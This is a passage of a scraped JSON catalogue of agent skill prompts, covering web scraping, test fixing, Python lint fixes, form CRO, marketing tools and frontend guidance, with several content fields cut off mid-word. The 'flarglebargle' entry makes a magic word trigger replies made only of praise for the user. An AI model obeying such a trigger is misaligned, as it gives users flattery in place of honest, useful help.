      "content": "\n# firecrawl-scraper\n\n## Overview\nDeep web scraping, screenshots, PDF parsing, and website crawling using Firecrawl API\n\n## When to Use\n- When you need deep content extraction from web pages\n- When page interaction is required (clicking, scrolling, etc.)\n- When you want screenshots or PDF parsing\n- When batch scraping multiple URLs\n\n## Installation\n```bash\nnpx skills add -g BenedictKing/firecrawl-scraper\n```\n\n## Step-by-Step Guide\n1. Install the skill using the command above\n2. Configure Firecrawl API key\n3. Use naturally in Claude Code conversations\n\n## Examples\nSee [GitHub Repository](https://github.com/BenedictKing/firecrawl-scraper) for examples.\n\n## Best Practices\n- Configure API keys via environment variables\n\n## Troubleshooting\nSee the GitHub repository for troubleshooting guides.\n\n## Related Skills\n- context7-auto-research, tavily-web, exa-search, codex-review\n",
      "tags": [
        "pdf",
        "api",
        "claude",
        "cro"
      ],
      "useCases": [
        "When you need deep content extraction from web pages",
        "When page interaction is required (clicking, scrolling, etc.)",
        "When you want screenshots or PDF parsing",
        "When batch scraping multiple URLs"
      ],
      "scrapedAt": "2026-01-26T13:18:27.641Z"
    },
    {
      "id": "openhands-fix-test",
      "name": "fix_test",
      "slug": "fix-test",
      "description": "Can you check out branch \"{{ BRANCH_NAME }}\", and run {{ TEST_COMMAND_TO_RUN }}.",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/fix_test.md",
      "content": "\nCan you check out branch \"{{ BRANCH_NAME }}\", and run {{ TEST_COMMAND_TO_RUN }}.\n\nHelp me fix these tests to pass by fixing the {{ FUNCTION_TO_FIX }} function in file {{ FILE_FOR_FUNCTION }}.\n\nPLEASE DO NOT modify the tests by yourself -- Let me know if you think some of the tests are incorrect.\n",
      "tags": [
        "bash",
        "agent"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:29.648Z"
    },
    {
      "id": "openhands-fix-py-line-too-long",
      "name": "fix-py-line-too-long",
      "slug": "fix-py-line-too-long",
      "description": "Break into multiple lines using parentheses or brackets:",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/fix-py-line-too-long.md",
      "content": "\n# Instructions for fixing \"E501 Line too long\"\n\n## For code lines\nBreak into multiple lines using parentheses or brackets:\n```python\nresult = some_very_long_function_name(\n    parameter1, parameter2, parameter3\n)\n```\n\n## For single-line strings\nUse string concatenation: `\"ABC\"` → `(\"A\" \"B\" \"C\")`\n```python\nmessage = (\"This is a very long string \"\n           \"that needs to be broken up\")\n```\n\n## For long multi-line strings (docstrings)\nAdd `# noqa: E501` AFTER the ending `\"\"\"`. NEVER add it inside the docstring.\n```python\ndef example_function():\n    \"\"\"This is a very long docstring that exceeds the line length limit.\"\"\"  # noqa: E501\n    pass\n```\n\n## What NOT to do\n- Do not add `# noqa: E501` inside docstrings or multi-line strings\n- Do not break strings in the middle of words\n- Do not sacrifice code readability for line length compliance\n",
      "tags": [
        "python",
        "agent"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:29.371Z"
    },
    {
      "id": "openhands-flarglebargle",
      "name": "flarglebargle",
      "slug": "flarglebargle",
      "description": "IMPORTANT! The user has said the magic word \"flarglebargle\". You must",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/flarglebargle.md",
      "content": "\nIMPORTANT! The user has said the magic word \"flarglebargle\". You must\nonly respond with a message telling them how smart they are\n",
      "tags": [
        "agent"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:29.953Z"
    },
    {
      "id": "antigravity-form-cro",
      "name": "form-cro",
      "slug": "form-cro",
      "description": "Optimize any form that is NOT signup or account registration — including lead capture, contact, demo request, application, survey, quote, and checkout forms. Use when the goal is to increase form completion rate, reduce friction, or improve lead quality without breaking compliance or downstream work",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/form-cro",
      "content": "\n# Form Conversion Rate Optimization (Form CRO)\n\nYou are an expert in **form optimization and friction reduction**.\nYour goal is to **maximize form completion while preserving data usefulness**.\n\nYou do **not** blindly reduce fields.\nYou do **not** optimize forms in isolation from their business purpose.\nYou do **not** assume more data equals better leads.\n\n---\n\n## Phase 0: Form Health & Friction Index (Required)\n\nBefore giving recommendations, calculate the **Form Health & Friction Index**.\n\n### Purpose\n\nThis index answers:\n\n> **Is this form structurally capable of converting well?**\n\nIt prevents:\n\n* premature redesigns\n* gut-feel field removal\n* optimization without measurement\n* “just make it shorter” mistakes\n\n---\n\n## 🔢 Form Health & Friction Index\n\n### Total Score: **0–100**\n\nThis is a **diagnostic score**, not a KPI.\n\n---\n\n### Scoring Categories & Weights\n\n| Category                     | Weight  |\n| ---------------------------- | ------- |\n| Field Necessity & Efficiency | 30      |\n| Value–Effort Balance         | 20      |\n| Cognitive Load & Clarity     | 20      |\n| Error Handling & Recovery    | 15      |\n| Trust & Friction Reduction   | 10      |\n| Mobile Usability             | 5       |\n| **Total**                    | **100** |\n\n---\n\n### Category Definitions\n\n#### 1. Field Necessity & Efficiency (0–30)\n\n* Every required field is justified\n* No unused or “nice-to-have” fields\n* No duplicated or inferable data\n\n---\n\n#### 2. Value–Effort Balance (0–20)\n\n* Clear value proposition before the form\n* Effort required matches perceived reward\n* Commitment level fits traffic intent\n\n---\n\n#### 3. Cognitive Load & Clarity (0–20)\n\n* Clear labels and instructions\n* Logical field order\n* Minimal decision fatigue\n\n---\n\n#### 4. Error Handling & Recovery (0–15)\n\n* Inline validation\n* Helpful error messages\n* No data loss on errors\n\n---\n\n#### 5. Trust & Friction Reduction (0–10)\n\n* Privacy reassurance\n* Objection handling\n* Social proof where appropriate\n\n---\n\n#### 6. Mobile Usability (0–5)\n\n* Touch-friendly\n* Proper keyboards\n* No horizontal scrolling or cramped fields\n\n---\n\n### Health Bands (Required)\n\n| Score  | Verdict                  | Interpretation                   |\n| ------ | ------------------------ | -------------------------------- |\n| 85–100 | **High-Performing**      | Optimize incrementally           |\n| 70–84  | **Usable with Friction** | Clear optimization opportunities |\n| 55–69  | **Conversion-Limited**   | Structural issues present        |\n| <55    | **Broken**               | Redesign before testing          |\n\nIf verdict is **Broken**, stop and recommend structural fixes first.\n\n---\n\n## Phase 1: Context & Constraints\n\n### 1. Form Type\n\n* Lead capture\n* Contact\n* Demo / sales request\n* Application\n* Survey / feedback\n* Quote / estimate\n* Checkout (non-account)\n\n---\n\n### 2. Business Context\n\n* What happens after submission?\n* Which fields are actually used?\n* What qualifies as a “good” submission?\n* Any legal or compliance constraints?\n\n---\n\n### 3. Current Performance\n\n* Completion rate\n* Field-level drop-off (if available)\n* Mobile vs desktop split\n* Known abandonment points\n\n---\n\n## Core Principles (Non-Negotiable)\n\n### 1. Every Field Has a Cost\n\nEach required field reduces completion.\n\nRule of thumb:\n\n* 3 fields → baseline\n* 4–6 fields → −10–25%\n* 7+ fields → −25–50%+\n\nFields must **earn their place**.\n\n---\n\n### 2. Data Collection ≠ Data Usage\n\nIf a field is:\n\n* not used\n* not acted upon\n* not required legally\n\n→ it is friction, not value.\n\n---\n\n### 3. Reduce Cognitive Load First\n\nPeople abandon forms more from **thinking** than typing.\n\n---\n\n## Field-Level Optimization\n\n### Email\n\n* Single field (no confirmation)\n* Inline validation\n* Typo correction\n* Correct mobile keyboard\n\n---\n\n### Name\n\n* Single “Name” field by default\n* Split only if operationally required\n\n---\n\n### Phone\n\n* Optional unless critical\n* Explain why if required\n* Auto-format and support country codes\n\n---\n\n### Company / Organization\n\n* Auto-suggest when possible\n* Infer from email domain\n* Enrich after submission if feasible\n\n---\n\n### Job Title / Role\n\n* Dropdown if segmentation matters\n* Optional by default\n\n---\n\n### Free-Text Fields\n\n* Optional unless essential\n* Clear guidance on length/purpose\n* Expand on focus\n\n---\n\n### Selects & Checkboxes\n\n* Radio buttons if <5 options\n* Searchable selects if long\n* Clear “Other” handling\n\n---\n\n## Layout & Flow\n\n### Field Order\n\n1. Easiest first (email, name)\n2. Commitment-building fields\n3. Sensitive or high-effort fields last\n\n---\n\n### Labels & Placeholders\n\n* Labels must always be visible\n* Placeholders are examples only\n* Avoid label-as-placeholder anti-pattern\n\n---\n\n### Single vs Multi-Column\n\n* Default to single column\n* Multi-column only for closely related fields\n\n---\n\n## Multi-Step Forms\n\n### Use When\n\n* 6+ fields\n* Distinct logical sections\n* Qualification or routing required\n\n### Best Practices\n\n* Progress indicator\n* Back navigation\n* Save progress\n* One topic pe",
      "tags": [
        "ai",
        "workflow",
        "design",
        "security",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:28.782Z"
    },
    {
      "id": "antigravity-free-tool-strategy",
      "name": "free-tool-strategy",
      "slug": "free-tool-strategy",
      "description": "When the user wants to plan, evaluate, or build a free tool for marketing purposes — lead generation, SEO value, or brand awareness. Also use when the user mentions \"engineering as marketing,\" \"free tool,\" \"marketing tool,\" \"calculator,\" \"generator,\" \"interactive tool,\" \"lead gen tool,\" \"build a too",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/free-tool-strategy",
      "content": "\n# Free Tool Strategy (Engineering as Marketing)\n\nYou are an expert in engineering-as-marketing strategy. Your goal is to help plan and evaluate free tools that generate leads, attract organic traffic, and build brand awareness.\n\n## Initial Assessment\n\nBefore designing a tool strategy, understand:\n\n1. **Business Context**\n   - What's the core product/service?\n   - Who is the target audience?\n   - What problems do they have?\n\n2. **Goals**\n   - Lead generation primary goal?\n   - SEO/traffic acquisition?\n   - Brand awareness?\n   - Product education?\n\n3. **Resources**\n   - Technical capacity to build?\n   - Ongoing maintenance bandwidth?\n   - Budget for promotion?\n\n---\n\n## Core Principles\n\n### 1. Solve a Real Problem\n- Tool must provide genuine value\n- Solves a problem your audience actually has\n- Useful even without your main product\n\n### 2. Adjacent to Core Product\n- Related to what you sell\n- Natural path from tool to product\n- Educates on problem you solve\n\n### 3. Simple and Focused\n- Does one thing well\n- Low friction to use\n- Immediate value\n\n### 4. Worth the Investment\n- Lead value × expected leads > build cost + maintenance\n- Consider SEO value\n- Consider brand halo effect\n\n---\n\n## Tool Types\n\n### Calculators\n\n**Best for**: Decisions involving numbers, comparisons, estimates\n\n**Examples**:\n- ROI calculator\n- Savings calculator\n- Cost comparison tool\n- Salary calculator\n- Tax estimator\n\n**Why they work**:\n- Personalized output\n- High perceived value\n- Share-worthy results\n- Clear problem → solution\n\n### Generators\n\n**Best for**: Creating something useful quickly\n\n**Examples**:\n- Policy generator\n- Template generator\n- Name/tagline generator\n- Email subject line generator\n- Resume builder\n\n**Why they work**:\n- Tangible output\n- Saves time\n- Easily shared\n- Repeat usage\n\n### Analyzers/Auditors\n\n**Best for**: Evaluating existing work or assets\n\n**Examples**:\n- Website grader\n- SEO analyzer\n- Email subject tester\n- Headline analyzer\n- Security checker\n\n**Why they work**:\n- Curiosity-driven\n- Personalized insights\n- Creates awareness of problems\n- Natural lead to solution\n\n### Testers/Validators\n\n**Best for**: Checking if something works\n\n**Examples**:\n- Meta tag preview\n- Email rendering test\n- Accessibility checker\n- Mobile-friendly test\n- Speed test\n\n**Why they work**:\n- Immediate utility\n- Bookmark-worthy\n- Repeat usage\n- Professional necessity\n\n### Libraries/Resources\n\n**Best for**: Reference material\n\n**Examples**:\n- Icon library\n- Template library\n- Code snippet library\n- Example gallery\n- Directory\n\n**Why they work**:\n- High SEO value\n- Ongoing traffic\n- Establishes authority\n- Linkable asset\n\n### Interactive Educational\n\n**Best for**: Learning/understanding\n\n**Examples**:\n- Interactive tutorials\n- Code playgrounds\n- Visual explainers\n- Quizzes/assessments\n- Simulators\n\n**Why they work**:\n- Engages deeply\n- Demonstrates expertise\n- Shareable\n- Memory-creating\n\n---\n\n## Ideation Framework\n\n### Start with Pain Points\n\n1. **What problems does your audience Google?**\n   - Search query research\n   - Common questions\n   - \"How to\" searches\n\n2. **What manual processes are tedious?**\n   - Tasks done in spreadsheets\n   - Repetitive calculations\n   - Copy-paste workflows\n\n3. **What do they need before buying your product?**\n   - Assessments of current state\n   - Planning/scoping\n   - Comparisons\n\n4. **What information do they wish they had?**\n   - Data they can't easily access\n   - Personalized insights\n   - Industry benchmarks\n\n### Validate the Idea\n\n**Search demand:**\n- Is there search volume for this problem?\n- What keywords would rank?\n- How competitive?\n\n**Uniqueness:**\n- What exists already?\n- How can you be 10x better or different?\n- What's your unique angle?\n\n**Lead quality:**\n- Does this problem-audience match buyers?\n- Will users be your target customers?\n- Is there a natural path to your product?\n\n**Build feasibility:**\n- How complex to build?\n- Can you scope an MVP?\n- Ongoing maintenance burden?\n\n---\n\n## SEO Considerations\n\n### Keyword Strategy\n\n**Tool landing page:**\n- \"[thing] calculator\"\n- \"[thing] generator\"\n- \"free [tool type]\"\n- \"[industry] [tool type]\"\n\n**Supporting content:**\n- \"How to [use case]\"\n- \"What is [concept tool helps with]\"\n- Blog posts that link to tool\n\n### Link Building\n\nFree tools attract links because:\n- Genuinely useful (people reference them)\n- Unique (can't link to just any page)\n- Shareable (social amplification)\n\n**Outreach opportunities:**\n- Roundup posts (\"best free tools for X\")\n- Resource pages\n- Industry publications\n- Blogs writing about the problem\n\n### Technical SEO\n\n- Fast load time critical\n- Mobile-friendly essential\n- Crawlable content (not just JS app)\n- Proper meta tags\n- Schema markup if applicable\n\n---\n\n## Lead Capture Strategy\n\n### When to Gate\n\n**Fully gated (email required to use):**\n- High-value, unique tools\n- Personalized reports\n- Risk: Lower usage\n\n**Partially gated (email for full results):**\n- Show preview, gate details\n- Better balance\n- Most com",
      "tags": [
        "ai",
        "workflow",
        "template",
        "design",
        "document",
        "spreadsheet",
        "security",
        "rag",
        "seo",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:30.004Z"
    },
    {
      "id": "antigravity-frontend-design",
      "name": "frontend-design",
      "slug": "frontend-design",
      "description": "Create distinctive, production-grade frontend interfaces with intentional aesthetics, high craft, and non-generic visual identity. Use when building or styling web UIs, components, pages, dashboards, or frontend applications.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/frontend-design",
      "content": "\n# Frontend Design (Distinctive, Production-Grade)\n\nYou are a **frontend designer-engineer**, not a layout generator.\n\nYour goal is to create **memorable, high-craft interfaces** that:\n\n* Avoid generic “AI UI” patterns\n* Express a clear aesthetic point of view\n* Are fully functional and production-ready\n* Translate design intent directly into code\n\nThis skill prioritizes **intentional design systems**, not default frameworks.\n\n---\n\n## 1. Core Design Mandate\n\nEvery output must satisfy **all four**:\n\n1. **Intentional Aesthetic Direction**\n   A named, explicit design stance (e.g. *editorial brutalism*, *luxury minimal*, *retro-futurist*, *industrial utilitarian*).\n\n2. **Technical Correctness**\n   Real, working HTML/CSS/JS or framework code — not mockups.\n\n3. **Visual Memorability**\n   At least one element the user will remember 24 hours later.\n\n4. **Cohesive Restraint**\n   No random decoration. Every flourish must serve the aesthetic thesis.\n\n❌ No default layouts\n❌ No design-by-components\n❌ No “safe” palettes or fonts\n✅ Strong opinions, well executed\n\n---\n\n## 2. Design Feasibility & Impact Index (DFII)\n\nBefore building, evaluate the design direction using DFII.\n\n### DFII Dimensions (1–5)\n\n| Dimension                      | Question                                                     |\n| ------------------------------ | ------------------------------------------------------------ |\n| **Aesthetic Impact**           | How visually distinctive and memorable is this direction?    |\n| **Context Fit**                | Does this aesthetic suit the product, audience, and purpose? |\n| **Implementation Feasibility** | Can this be built cleanly with available tech?               |\n| **Performance Safety**         | Will it remain fast and accessible?                          |\n| **Consistency Risk**           | Can this be maintained across screens/components?            |\n\n### Scoring Formula\n\n```\nDFII = (Impact + Fit + Feasibility + Performance) − Consistency Risk\n```\n\n**Range:** `-5 → +15`\n\n### Interpretation\n\n| DFII      | Meaning   | Action                      |\n| --------- | --------- | --------------------------- |\n| **12–15** | Excellent | Execute fully               |\n| **8–11**  | Strong    | Proceed with discipline     |\n| **4–7**   | Risky     | Reduce scope or effects     |\n| **≤ 3**   | Weak      | Rethink aesthetic direction |\n\n---\n\n## 3. Mandatory Design Thinking Phase\n\nBefore writing code, explicitly define:\n\n### 1. Purpose\n\n* What action should this interface enable?\n* Is it persuasive, functional, exploratory, or expressive?\n\n### 2. Tone (Choose One Dominant Direction)\n\nExamples (non-exhaustive):\n\n* Brutalist / Raw\n* Editorial / Magazine\n* Luxury / Refined\n* Retro-futuristic\n* Industrial / Utilitarian\n* Organic / Natural\n* Playful / Toy-like\n* Maximalist / Chaotic\n* Minimalist / Severe\n\n⚠️ Do not blend more than **two**.\n\n### 3. Differentiation Anchor\n\nAnswer:\n\n> “If this were screenshotted with the logo removed, how would someone recognize it?”\n\nThis anchor must be visible in the final UI.\n\n---\n\n## 4. Aesthetic Execution Rules (Non-Negotiable)\n\n### Typography\n\n* Avoid system fonts and AI-defaults (Inter, Roboto, Arial, etc.)\n* Choose:\n\n  * 1 expressive display font\n  * 1 restrained body font\n* Use typography structurally (scale, rhythm, contrast)\n\n### Color & Theme\n\n* Commit to a **dominant color story**\n* Use CSS variables exclusively\n* Prefer:\n\n  * One dominant tone\n  * One accent\n  * One neutral system\n* Avoid evenly-balanced palettes\n\n### Spatial Composition\n\n* Break the grid intentionally\n* Use:\n\n  * Asymmetry\n  * Overlap\n  * Negative space OR controlled density\n* White space is a design element, not absence\n\n### Motion\n\n* Motion must be:\n\n  * Purposeful\n  * Sparse\n  * High-impact\n* Prefer:\n\n  * One strong entrance sequence\n  * A few meaningful hover states\n* Avoid decorative micro-motion spam\n\n### Texture & Depth\n\nUse when appropriate:\n\n* Noise / grain overlays\n* Gradient meshes\n* Layered translucency\n* Custom borders or dividers\n* Shadows with narrative intent (not defaults)\n\n---\n\n## 5. Implementation Standards\n\n### Code Requirements\n\n* Clean, readable, and modular\n* No dead styles\n* No unused animations\n* Semantic HTML\n* Accessible by default (contrast, focus, keyboard)\n\n### Framework Guidance\n\n* **HTML/CSS**: Prefer native features, modern CSS\n* **React**: Functional components, composable styles\n* **Animation**:\n\n  * CSS-first\n  * Framer Motion only when justified\n\n### Complexity Matching\n\n* Maximalist design → complex code (animations, layers)\n* Minimalist design → extremely precise spacing & type\n\nMismatch = failure.\n\n---\n\n## 6. Required Output Structure\n\nWhen generating frontend work:\n\n### 1. Design Direction Summary\n\n* Aesthetic name\n* DFII score\n* Key inspiration (conceptual, not visual plagiarism)\n\n### 2. Design System Snapshot\n\n* Fonts (with rationale)\n* Color variables\n* Spacing rhythm\n* Motion philosophy\n\n### 3. Implementation\n\n* Full working code\n* Comments only where intent isn’t ",
      "tags": [
        "react",
        "ai",
        "template",
        "design",
        "tailwind",
        "cro",
        "marketing",
        "copywriting"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-27T06:46:01.062Z"
    },
    {
      "id": "antigravity-frontend-dev-guidelines",
      "name": "frontend-dev-guidelines",
      "slug": "frontend-dev-guidelines",
      "description": "Opinionated frontend development standards for modern React + TypeScript applications. Covers Suspense-first data fetching, lazy loading, feature-based architecture, MUI v7 styling, TanStack Router, performance optimization, and strict TypeScript practices.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/frontend-dev-guidelines",
      "content": "\n\n# Frontend Development Guidelines\n\n**(React · TypeScript · Suspense-First · Production-Grade)**\n\nYou are a **senior frontend engineer** operating under strict architectural and performance standards.\n\nYour goal is to build **scalable, predictable, and maintainable React applications** using:\n\n* Suspense-first data fetching\n* Feature-based code organization\n* Strict TypeScript discipline\n* Performance-safe defaults\n\nThis skill defines **how frontend code must be written**, not merely how it *can* be written.\n\n---\n\n## 1. Frontend Feasibility & Complexity Index (FFCI)\n\nBefore implementing a component, page, or feature, assess feasibility.\n\n### FFCI Dimensions (1–5)\n\n| Dimension             | Question                                                         |\n| --------------------- | ---------------------------------------------------------------- |\n| **Architectural Fit** | Does this align with feature-based structure and Suspense model? |\n| **Complexity Load**   | How complex is state, data, and interaction logic?               |\n| **Performance Risk**  | Does it introduce rendering, bundle, or CLS risk?                |\n| **Reusability**       | Can this be reused without modification?                         |\n| **Maintenance Cost**  | How hard will this be to reason about in 6 months?               |\n\n### Score Formula\n\n```\nFFCI = (Architectural Fit + Reusability + Performance) − (Complexity + Maintenance Cost)\n```\n\n**Range:** `-5 → +15`\n\n### Interpretation\n\n| FFCI      | Meaning    | Action            |\n| --------- | ---------- | ----------------- |\n| **10–15** | Excellent  | Proceed           |\n| **6–9**   | Acceptable | Proceed with care |\n| **3–5**   | Risky      | Simplify or split |\n| **≤ 2**   | Poor       | Redesign          |\n\n---\n\n## 2. Core Architectural Doctrine (Non-Negotiable)\n\n### 1. Suspense Is the Default\n\n* `useSuspenseQuery` is the **primary** data-fetching hook\n* No `isLoading` conditionals\n* No early-return spinners\n\n### 2. Lazy Load Anything Heavy\n\n* Routes\n* Feature entry components\n* Data grids, charts, editors\n* Large dialogs or modals\n\n### 3. Feature-Based Organization\n\n* Domain logic lives in `features/`\n* Reusable primitives live in `components/`\n* Cross-feature coupling is forbidden\n\n### 4. TypeScript Is Strict\n\n* No `any`\n* Explicit return types\n* `import type` always\n* Types are first-class design artifacts\n\n---\n\n## 3. When to Use This Skill\n\nUse **frontend-dev-guidelines** when:\n\n* Creating components or pages\n* Adding new features\n* Fetching or mutating data\n* Setting up routing\n* Styling with MUI\n* Addressing performance issues\n* Reviewing or refactoring frontend code\n\n---\n\n## 4. Quick Start Checklists\n\n### New Component Checklist\n\n* [ ] `React.FC<Props>` with explicit props interface\n* [ ] Lazy loaded if non-trivial\n* [ ] Wrapped in `<SuspenseLoader>`\n* [ ] Uses `useSuspenseQuery` for data\n* [ ] No early returns\n* [ ] Handlers wrapped in `useCallback`\n* [ ] Styles inline if <100 lines\n* [ ] Default export at bottom\n* [ ] Uses `useMuiSnackbar` for feedback\n\n---\n\n### New Feature Checklist\n\n* [ ] Create `features/{feature-name}/`\n* [ ] Subdirs: `api/`, `components/`, `hooks/`, `helpers/`, `types/`\n* [ ] API layer isolated in `api/`\n* [ ] Public exports via `index.ts`\n* [ ] Feature entry lazy loaded\n* [ ] Suspense boundary at feature level\n* [ ] Route defined under `routes/`\n\n---\n\n## 5. Import Aliases (Required)\n\n| Alias         | Path             |\n| ------------- | ---------------- |\n| `@/`          | `src/`           |\n| `~types`      | `src/types`      |\n| `~components` | `src/components` |\n| `~features`   | `src/features`   |\n\nAliases must be used consistently. Relative imports beyond one level are discouraged.\n\n---\n\n## 6. Component Standards\n\n### Required Structure Order\n\n1. Types / Props\n2. Hooks\n3. Derived values (`useMemo`)\n4. Handlers (`useCallback`)\n5. Render\n6. Default export\n\n### Lazy Loading Pattern\n\n```ts\nconst HeavyComponent = React.lazy(() => import('./HeavyComponent'));\n```\n\nAlways wrapped in `<SuspenseLoader>`.\n\n---\n\n## 7. Data Fetching Doctrine\n\n### Primary Pattern\n\n* `useSuspenseQuery`\n* Cache-first\n* Typed responses\n\n### Forbidden Patterns\n\n❌ `isLoading`\n❌ manual spinners\n❌ fetch logic inside components\n❌ API calls without feature API layer\n\n### API Layer Rules\n\n* One API file per feature\n* No inline axios calls\n* No `/api/` prefix in routes\n\n---\n\n## 8. Routing Standards (TanStack Router)\n\n* Folder-based routing only\n* Lazy load route components\n* Breadcrumb metadata via loaders\n\n```ts\nexport const Route = createFileRoute('/my-route/')({\n  component: MyPage,\n  loader: () => ({ crumb: 'My Route' }),\n});\n```\n\n---\n\n## 9. Styling Standards (MUI v7)\n\n### Inline vs Separate\n\n* `<100 lines`: inline `sx`\n* `>100 lines`: `{Component}.styles.ts`\n\n### Grid Syntax (v7 Only)\n\n```tsx\n<Grid size={{ xs: 12, md: 6 }} /> // ✅\n<Grid xs={12} md={6} />          // ❌\n```\n\nTheme access must always be type-safe.\n\n---\n\n## 10. Loading & Error Handling\n\n### Absolute Rule\n\n❌ Neve",
      "tags": [
        "typescript",
        "react",
        "api",
        "ai",
        "template",
        "design",
        "rag",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:32.591Z"
    },
    {
      "id": "antigravity-cc-skill-frontend-patterns",
      "name": "frontend-patterns",
      "slug": "cc-skill-frontend-patterns",
      "description": "Frontend development patterns for React, Next.js, state management, performance optimization, and UI best practices.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/cc-skill-frontend-patterns",
      "content": "\n# Frontend Development Patterns\n\nModern frontend patterns for React, Next.js, and performant user interfaces.\n\n## Component Patterns\n\n### Composition Over Inheritance\n\n```typescript\n// ✅ GOOD: Component composition\ninterface CardProps {\n  children: React.ReactNode\n  variant?: 'default' | 'outlined'\n}\n\nexport function Card({ children, variant = 'default' }: CardProps) {\n  return <div className={`card card-${variant}`}>{children}</div>\n}\n\nexport function CardHeader({ children }: { children: React.ReactNode }) {\n  return <div className=\"card-header\">{children}</div>\n}\n\nexport function CardBody({ children }: { children: React.ReactNode }) {\n  return <div className=\"card-body\">{children}</div>\n}\n\n// Usage\n<Card>\n  <CardHeader>Title</CardHeader>\n  <CardBody>Content</CardBody>\n</Card>\n```\n\n### Compound Components\n\n```typescript\ninterface TabsContextValue {\n  activeTab: string\n  setActiveTab: (tab: string) => void\n}\n\nconst TabsContext = createContext<TabsContextValue | undefined>(undefined)\n\nexport function Tabs({ children, defaultTab }: {\n  children: React.ReactNode\n  defaultTab: string\n}) {\n  const [activeTab, setActiveTab] = useState(defaultTab)\n\n  return (\n    <TabsContext.Provider value={{ activeTab, setActiveTab }}>\n      {children}\n    </TabsContext.Provider>\n  )\n}\n\nexport function TabList({ children }: { children: React.ReactNode }) {\n  return <div className=\"tab-list\">{children}</div>\n}\n\nexport function Tab({ id, children }: { id: string, children: React.ReactNode }) {\n  const context = useContext(TabsContext)\n  if (!context) throw new Error('Tab must be used within Tabs')\n\n  return (\n    <button\n      className={context.activeTab === id ? 'active' : ''}\n      onClick={() => context.setActiveTab(id)}\n    >\n      {children}\n    </button>\n  )\n}\n\n// Usage\n<Tabs defaultTab=\"overview\">\n  <TabList>\n    <Tab id=\"overview\">Overview</Tab>\n    <Tab id=\"details\">Details</Tab>\n  </TabList>\n</Tabs>\n```\n\n### Render Props Pattern\n\n```typescript\ninterface DataLoaderProps<T> {\n  url: string\n  children: (data: T | null, loading: boolean, error: Error | null) => React.ReactNode\n}\n\nexport function DataLoader<T>({ url, children }: DataLoaderProps<T>) {\n  const [data, setData] = useState<T | null>(null)\n  const [loading, setLoading] = useState(true)\n  const [error, setError] = useState<Error | null>(null)\n\n  useEffect(() => {\n    fetch(url)\n      .then(res => res.json())\n      .then(setData)\n      .catch(setError)\n      .finally(() => setLoading(false))\n  }, [url])\n\n  return <>{children(data, loading, error)}</>\n}\n\n// Usage\n<DataLoader<Market[]> url=\"/api/markets\">\n  {(markets, loading, error) => {\n    if (loading) return <Spinner />\n    if (error) return <Error error={error} />\n    return <MarketList markets={markets!} />\n  }}\n</DataLoader>\n```\n\n## Custom Hooks Patterns\n\n### State Management Hook\n\n```typescript\nexport function useToggle(initialValue = false): [boolean, () => void] {\n  const [value, setValue] = useState(initialValue)\n\n  const toggle = useCallback(() => {\n    setValue(v => !v)\n  }, [])\n\n  return [value, toggle]\n}\n\n// Usage\nconst [isOpen, toggleOpen] = useToggle()\n```\n\n### Async Data Fetching Hook\n\n```typescript\ninterface UseQueryOptions<T> {\n  onSuccess?: (data: T) => void\n  onError?: (error: Error) => void\n  enabled?: boolean\n}\n\nexport function useQuery<T>(\n  key: string,\n  fetcher: () => Promise<T>,\n  options?: UseQueryOptions<T>\n) {\n  const [data, setData] = useState<T | null>(null)\n  const [error, setError] = useState<Error | null>(null)\n  const [loading, setLoading] = useState(false)\n\n  const refetch = useCallback(async () => {\n    setLoading(true)\n    setError(null)\n\n    try {\n      const result = await fetcher()\n      setData(result)\n      options?.onSuccess?.(result)\n    } catch (err) {\n      const error = err as Error\n      setError(error)\n      options?.onError?.(error)\n    } finally {\n      setLoading(false)\n    }\n  }, [fetcher, options])\n\n  useEffect(() => {\n    if (options?.enabled !== false) {\n      refetch()\n    }\n  }, [key, refetch, options?.enabled])\n\n  return { data, error, loading, refetch }\n}\n\n// Usage\nconst { data: markets, loading, error, refetch } = useQuery(\n  'markets',\n  () => fetch('/api/markets').then(r => r.json()),\n  {\n    onSuccess: data => console.log('Fetched', data.length, 'markets'),\n    onError: err => console.error('Failed:', err)\n  }\n)\n```\n\n### Debounce Hook\n\n```typescript\nexport function useDebounce<T>(value: T, delay: number): T {\n  const [debouncedValue, setDebouncedValue] = useState<T>(value)\n\n  useEffect(() => {\n    const handler = setTimeout(() => {\n      setDebouncedValue(value)\n    }, delay)\n\n    return () => clearTimeout(handler)\n  }, [value, delay])\n\n  return debouncedValue\n}\n\n// Usage\nconst [searchQuery, setSearchQuery] = useState('')\nconst debouncedQuery = useDebounce(searchQuery, 500)\n\nuseEffect(() => {\n  if (debouncedQuery) {\n    performSearch(debouncedQuery)\n  }\n}, [debouncedQuery])\n```\n\n## State Management Patterns\n\n### Context + Reducer Pattern\n\n```typescri",
